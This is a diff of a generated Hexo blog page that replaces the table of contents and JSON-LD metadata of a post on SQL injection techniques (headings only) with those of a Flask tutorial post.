@@ -3062,7 +3015,7 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
 
 
     <div class='content'>
-        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%89%8D%E8%A8%80"><span class="toc-text">前言</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#1-%E6%B3%A8%E5%85%A5%E7%82%B9%E5%88%A4%E6%96%AD"><span class="toc-text">1.注入点判断</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2-%E6%95%B0%E6%8D%AE%E8%A1%A8%E5%AD%97%E6%AE%B5%E6%95%B0%E5%88%A4%E6%96%AD"><span class="toc-text">2.数据表字段数判断</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#3-%E6%B3%A8%E5%85%A5%E6%89%8B%E6%B3%95"><span class="toc-text">3.注入手法</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-%E8%81%94%E5%90%88%E6%B3%A8%E5%85%A5-union%E6%B3%A8%E5%85%A5"><span class="toc-text">1.联合注入(union注入)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5"><span class="toc-text">2.报错注入</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-%E7%9B%B2%E6%B3%A8"><span class="toc-text">3.盲注</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1-%E5%B8%83%E5%B0%94%E7%9B%B2%E6%B3%A8"><span class="toc-text">1.布尔盲注</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#3-%E6%97%B6%E9%97%B4%E7%9B%B2%E6%B3%A8"><span class="toc-text">3.时间盲注</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4-HTTP%E5%A4%B4%E6%B3%A8%E5%85%A5"><span class="toc-text">4.HTTP头注入</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1-User-Agent%E6%B3%A8%E5%85%A5"><span class="toc-text">1.User-Agent注入</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-referer%E6%B3%A8%E5%85%A5"><span class="toc-text">2.referer注入</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#3-cookie%E6%B3%A8%E5%85%A5"><span class="toc-text">3.cookie注入</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#5-%E4%BA%8C%E9%98%B6%E6%B3%A8%E5%85%A5"><span class="toc-text">5.二阶注入</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#6-%E5%AE%BD%E5%AD%97%E8%8A%82%E6%B3%A8%E5%85%A5"><span class="toc-text">6.宽字节注入</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#7-%E5%A0%86%E5%8F%A0%E6%9F%A5%E8%AF%A2"><span class="toc-text">7.堆叠查询</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#4-%E8%BF%87%E6%BB%A4%E7%BB%95%E8%BF%87"><span class="toc-text">4.过滤绕过</span></a></li></ol>
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%89%8D%E8%A8%80"><span class="toc-text">前言</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#1-Flask%E7%AE%80%E4%BB%8B"><span class="toc-text">1.Flask简介</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2-Hello-World"><span class="toc-text">2.Hello World</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#3-Flask%E5%9F%BA%E6%9C%AC%E6%A6%82%E5%BF%B5"><span class="toc-text">3.Flask基本概念</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#4-Flask%E8%B7%AF%E7%94%B1"><span class="toc-text">4.Flask路由</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#5-Flask-%E8%A7%86%E5%9B%BE%E5%87%BD%E6%95%B0"><span class="toc-text">5.Flask 视图函数</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#6-%E6%A8%A1%E6%9D%BF%E6%B8%B2%E6%9F%93"><span class="toc-text">6.模板渲染</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-%E5%88%9B%E5%BB%BA%E6%A8%A1%E6%9D%BF"><span class="toc-text">1.创建模板</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-%E6%A8%A1%E6%9D%BF%E7%BB%A7%E6%89%BF"><span class="toc-text">2.模板继承</span></a></li></ol></li></ol>
     </div>
   </section>
 
@@ -3632,7 +3585,7 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
 </script>
 
 
-  <script type="application/ld+json">[{"@context":"http://schema.org","@type":"Organization","name":"Hexo","url":"http://example.com/","logo":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png","width":192,"height":192}},{"@context":"http://schema.org","@type":"Person","name":"John Doe","image":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png"},"url":"http://example.com/","sameAs":["https://github.com/volantis-x"],"description":""},{"@context":"http://schema.org","@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"item":{"@id":"http://example.com/","name":"Hexo"}},{"@type":"ListItem","position":3,"item":{"@id":"http://example.com/2025/01/12/sql注入/","name":"sql注入"}}]},{"@context":"http://schema.org","@type":"WebSite","name":"Hexo","url":"http://example.com/","keywords":null,"description":"","author":{"@type":"Person","name":"John Doe","image":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png"},"url":"http://example.com/","description":""},"publisher":{"@type":"Organization","name":"Hexo","url":"http://example.com/","logo":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png","width":192,"height":192}},"potentialAction":{"@type":"SearchAction","name":"Site Search","target":{"@type":"EntryPoint","urlTemplate":"http://example.com?s={search_term_string}"},"query-input":"required name=search_term_string"}},{"@context":"http://schema.org","@type":"BlogPosting","headline":"sql注入","description":"","inLanguage":"en","mainEntityOfPage":{"@type":"WebPage","@id":"http://example.com/2025/01/12/sql%E6%B3%A8%E5%85%A5/"},"author":{"@type":"Person","name":"John Doe","image":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png"},"url":"http://example.com/"},"publisher":{"@type":"Organization","name":"Hexo","logo":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png","width":192,"height":192}},"url":"http://example.com/2025/01/12/sql%E6%B3%A8%E5%85%A5/","wordCount":0,"datePublished":"2025-01-12T05:28:35.000Z","dateModified":"2025-03-15T08:34:49.925Z","image":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png","width":192,"height":192}}]</script>
+  <script type="application/ld+json">[{"@context":"http://schema.org","@type":"Organization","name":"Hexo","url":"http://example.com/","logo":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png","width":192,"height":192}},{"@context":"http://schema.org","@type":"Person","name":"John Doe","image":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png"},"url":"http://example.com/","sameAs":["https://github.com/volantis-x"],"description":""},{"@context":"http://schema.org","@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"item":{"@id":"http://example.com/","name":"Hexo"}},{"@type":"ListItem","position":3,"item":{"@id":"http://example.com/2025/03/16/Flask/","name":"Flask"}}]},{"@context":"http://schema.org","@type":"WebSite","name":"Hexo","url":"http://example.com/","keywords":null,"description":"","author":{"@type":"Person","name":"John Doe","image":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png"},"url":"http://example.com/","description":""},"publisher":{"@type":"Organization","name":"Hexo","url":"http://example.com/","logo":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png","width":192,"height":192}},"potentialAction":{"@type":"SearchAction","name":"Site Search","target":{"@type":"EntryPoint","urlTemplate":"http://example.com?s={search_term_string}"},"query-input":"required name=search_term_string"}},{"@context":"http://schema.org","@type":"BlogPosting","headline":"Flask","description":"","inLanguage":"en","mainEntityOfPage":{"@type":"WebPage","@id":"http://example.com/2025/03/16/Flask/"},"author":{"@type":"Person","name":"John Doe","image":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png"},"url":"http://example.com/"},"publisher":{"@type":"Organization","name":"Hexo","logo":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png","width":192,"height":192}},"url":"http://example.com/2025/03/16/Flask/","wordCount":0,"datePublished":"2025-03-16T06:41:43.000Z","dateModified":"2025-03-25T07:06:22.853Z","image":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png","width":192,"height":192}}]</script>
 
 
 
